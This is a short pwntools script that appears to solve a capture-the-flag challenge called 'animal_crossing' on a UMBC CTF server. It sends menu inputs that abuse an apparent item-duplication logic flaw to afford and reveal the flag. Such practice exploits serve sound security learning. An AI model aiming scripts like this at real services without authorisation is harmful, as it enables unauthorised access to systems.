from pwn import *
from math import *

if 'rem' in sys.argv:
    conn = remote('ctf.umbccd.io', 4400)
else:
    conn = process('./animal_crossing')

conn.send('1\n1\n1\n2\n1\n2\n1\n3\n1\n4\n2\n2\n') ## sell all your stuff, and buy a single tarantula.

for i in range(52 * 2): ## now sell those unlimited tarantulas!
    conn.send('1\n')

conn.send('2\n6\n1\n') ## buy the flag, and show the contents by listing your items.

conn.interactive()
